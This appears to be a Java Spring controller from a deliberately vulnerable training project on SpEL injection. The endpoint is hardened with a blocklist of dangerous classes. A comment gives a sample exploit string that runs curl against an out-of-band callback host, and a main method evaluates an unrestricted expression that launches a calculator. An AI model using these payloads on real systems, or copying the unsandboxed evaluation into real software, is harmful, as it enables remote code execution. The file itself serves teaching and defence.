package org.joychou.controller;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.expression.spel.support.StandardTypeLocator;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /** Packages/classes blocked from T() resolution to prevent RCE. */
    private static final Set<String> BLOCKED_PREFIXES = new HashSet<>(Arrays.asList(
            "java.lang.Runtime",
            "java.lang.ProcessBuilder",
            "java.lang.System",
            "java.lang.Thread",
            "java.lang.ClassLoader",
            "java.lang.reflect.",
            "java.io.",
            "java.nio.",
            "java.net.",
            "javax.script.",
            "javax.management.",
            "org.springframework.cglib.",
            "sun.",
            "com.sun."
    ));

    /**
     * A TypeLocator that refuses to resolve dangerous types, preventing
     * RCE via T(java.lang.Runtime) and similar SpEL injection vectors.
     * Compatible with Spring 4.x (SimpleEvaluationContext is Spring 5+).
     */
    private static class SafeTypeLocator implements TypeLocator {

        private final StandardTypeLocator delegate = new StandardTypeLocator();

        @Override
        public Class<?> findType(String typeName) throws SpelEvaluationException {
            for (String prefix : BLOCKED_PREFIXES) {
                if (typeName.equals(prefix) || typeName.startsWith(prefix)) {
                    throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
                }
            }
            return delegate.findType(typeName);
        }
    }

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Use StandardEvaluationContext with a restricted TypeLocator that blocks
        // dangerous types (Runtime, ProcessBuilder, etc.) to prevent RCE.
        // SimpleEvaluationContext is not available in Spring 4.x.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new SafeTypeLocator());
        Object result = parser.parseExpression(expression).getValue(context);
        return result != null ? HtmlUtils.htmlEscape(result.toString()) : "";
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

